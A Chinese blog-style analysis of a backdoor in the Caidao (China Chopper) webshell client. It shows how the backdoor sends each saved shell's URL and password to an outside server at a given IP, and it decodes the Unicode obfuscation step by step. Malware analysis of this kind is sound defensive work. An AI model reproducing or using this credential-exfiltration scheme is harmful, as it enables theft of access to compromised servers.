**思考，这特么都是什么？**

之前明确说了，这是一个菜刀的后门，后门有什么用呢？当然是要收集你的 shell 了。显然，114 的这台服务器就 是 shell 上传的服务器了，那后面跟着的就是 shell 的信息了。

一个 shell 有什么信息呢？

*   URL (Shell 的地址)
    
*   Password (连接 Shell 需要的密码)
    
*   Type (Shell 的类型)
    
*   Encode (Shell 的编码)
    
*   Option (Shell 的配置信息)
    
*   ...
    

所以后门很可能就是上传了这些信息，但是思考一下，URL 和 Password 是必须的，其它的可有可无。

**后门URL初探**

再看一下这个后门 URL: `http://114.55.112.206/?=呈呔偔ᩐ༚༏䄏`

以等号为界划分开，前面有1个字符，后面有 8 个字符。我们添加的 shell 的 URL: `http://a` 8 个字符，密码: `b` 1 个字符。

ahaha，这下就明确了，后门的地址构成是这样的: `http://114.55.112.206/?密码＝URL`

论证一下，我们添加一个 shell，URL 是 `http://a` 密码是 `bb`，如果没猜错的话，等号前面应该是两个字符，后面还是 8 个。

`http://114.55.112.206/?䉂=呈呔偔ᩐ༚༏䄏`

**进一步分析URL**

既然 URL 是 Unicode，那我先把这个 URL 转成 unicode 看看和各个字符的 ASCII 码有没有联系：

![](../Images/653567e47ba5ff4c647ff67979335f35.png)  

转变之后，我们现在的情况是这样的：

| 操作 || 结果 |
| --- | --- |
| 菜刀中添加 || `http://114.55.112.206/?b=http://a` |
| --- | --- |
| 后门URL || `http://114.55.112.206/?=呈呔偔ᩐ༚༏䄏` |
| UnicodeEncode || `http://114.55.112.206/?\ue042=\u5448\u5454\u5054\u1a50\u0f1a\u0f0f\u410f\ue041` |

`\u5448\u5454\u5054` 看到里面有 `0f`,`1a`，那肯定都是 16 进制了，要不要试试把一个 unicode 字符拆成两半，转成 ASCII 码试试？

| 操作 || 结果 |
| --- | --- |
| 菜刀中添加 || `http://114.55.112.206/?b=http://a` |
| --- | --- |
| UnicodeEncode || `\ue042=\u5448\u5454\u5054\u1a50\u0f1a\u0f0f\u410f\ue041` |
| 部分转成 ASCII || `http://114.55.112.206/?\ue0B = \uTH \uTT \uPT \u1aP \u0f1a \u0f0f \uA0f \ue0A` |

为了方便看，我给 unicode 之前都加了一个空格，有些字符转成 ASCII 码后不可见，所以我就保留了。

观察

1.  等号前的密码部分，肯定是和我们输入的 `b` 有关，可以看到低 8 位转成 ASCII 码后，是 `B`, 这就有趣了。
    
2.  再看 URL 部分，`TH`, `TT`, `PT`, `0x1aP`, 注意看每一组的第二个字母：`HTTP`，咦，我们输入的 URL 不就是 `http://a`吗？再看第一个字符，连起来 `TTP` ? `H`呢？
    

看一下 ASCII 码值：

![](../Images/9856e812d9c328d503f09bd14de66489.png)  

看到规率了吗？每一个字符，都与一开始输入的字符相差了`0x20`！有点懂了，那些不可见的字符，正是因为减了 0x20 之后刚好到了不可见字符那里。

那我们尝试，给每一个加 0x20：

| 操作 || 结果 |
| --- | --- |
| 菜刀中添加 || `b=http://a` |
| --- | --- |
| UnicodeEncode || `\ue042=\u5448\u5454\u5054\u1a50\u0f1a\u0f0f\u410f\ue041` |
| Unicode + 0x20 || `\u10062=\u7468\u7474\u7074\u3a70\u2f3a\u2f2f\u612f\u10061` |
| Unicode+0x20 转可视字符 || `\u100b=\uth \utt \upt \u:p \u/: \u// \ua/ \u100a` |

说明：`0xe0` 加上 `0x20`之后是 `0x100` 溢出了，先不管了。

我把 `\u` 去了：`100b = th tt pt :p /: // a/ 100a`

看每一组的第2个字符，连起来：`http://a`。卧槽？

再看第一组的第1个字符，连起来：`ttp://a100`。卧槽？

懂了，这个 `0xe0` 加上 `0x20` 刚刚好是 `0`, 就是结束符号了！

所以，这他加密的算法大概就出来了。

**算法**

看了第 5 步的分析，其实你心里面已经有谱了。

原始串： `abcdef`

第一次，每次取该字符后面一个字符补到其前面，如果是最后一个，就在前面补0：`ba cb dc ed fe 0f`

第二次，每一个字符 ASCII 码减去 0x20(都是 16 进制), 0x100 减去 0x20 是 0xe0: `4241 4342 4443 4543 4645 e046`

第三次，每两个字符前面加上一个 `\u`，整体变成 unicode。
